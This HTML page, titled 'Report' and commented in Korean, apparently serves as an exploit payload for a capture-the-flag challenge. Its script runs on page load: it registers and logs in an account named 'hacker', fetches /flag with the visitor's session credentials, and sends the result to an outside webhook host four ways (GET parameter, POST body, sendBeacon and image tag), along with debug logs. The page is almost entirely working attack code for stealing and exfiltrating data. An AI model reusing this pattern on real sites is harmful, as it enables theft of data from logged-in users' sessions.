<!DOCTYPE html>
<html>
<head>
    <title>Report</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Processing...</h1>
    
    <script>
        // 디버깅을 위한 로그 함수
        function log(msg) {
            console.log(msg);
            // 웹훅으로 로그도 전송
            fetch('https://gkxuwhb.request.dreamhack.games/log?msg=' + encodeURIComponent(msg), {
                mode: 'no-cors'
            }).catch(() => {});
        }
        
        log('Script started');
        
        (async () => {
            try {
                const username = 'hacker';
                const password = 'hacker123';
                
                log('Step 1: Registering user');
                
                // 1. 계정 등록 시도
                try {
                    const registerForm = new FormData();
                    registerForm.append('username', username);
                    registerForm.append('password', password);
                    
                    const registerResp = await fetch('/register', {
                        method: 'POST',
                        body: registerForm,
                        credentials: 'include',
                        redirect: 'follow'
                    });
                    
                    log('Register response: ' + registerResp.status);
                } catch (e) {
                    log('Register error (might already exist): ' + e.message);
                }
                
                // 짧은 대기
                await new Promise(resolve => setTimeout(resolve, 300));
                
                log('Step 2: Logging in');
                
                // 2. 로그인
                const loginForm = new FormData();
                loginForm.append('username', username);
                loginForm.append('password', password);
                
                const loginResp = await fetch('/login', {
                    method: 'POST',
                    body: loginForm,
                    credentials: 'include',
                    redirect: 'follow'
                });
                
                log('Login response: ' + loginResp.status);
                
                // 로그인 완료 대기
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                log('Step 3: Accessing /flag');
                
                // 3. FLAG 획득
                const flagResp = await fetch('/flag', {
                    credentials: 'include',
                    redirect: 'follow'
                });
                
                log('Flag response: ' + flagResp.status);
                
                const flag = await flagResp.text();
                
                log('Flag received: ' + flag.substring(0, 20));
                
                // 4. FLAG 전송 (여러 방법 동시 사용)
                
                // 방법 1: GET 파라미터
                fetch('https://gkxuwhb.request.dreamhack.games/?flag=' + encodeURIComponent(flag), {
                    mode: 'no-cors'
                }).catch(() => {});
                
                // 방법 2: POST body
                fetch('https://gkxuwhb.request.dreamhack.games/post', {
                    mode: 'no-cors',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain'
                    },
                    body: flag
                }).catch(() => {});
                
                // 방법 3: sendBeacon
                navigator.sendBeacon('https://gkxuwhb.request.dreamhack.games/beacon', flag);
                
                // 방법 4: 이미지 태그 (가장 확실함)
                const img = new Image();
                img.src = 'https://gkxuwhb.request.dreamhack.games/img?flag=' + encodeURIComponent(flag);
                document.body.appendChild(img);
                
                log('All requests sent');
                
            } catch (error) {
                log('Error: ' + error.message);
                log('Stack: ' + error.stack);
            }
        })();
    </script>
</body>
</html
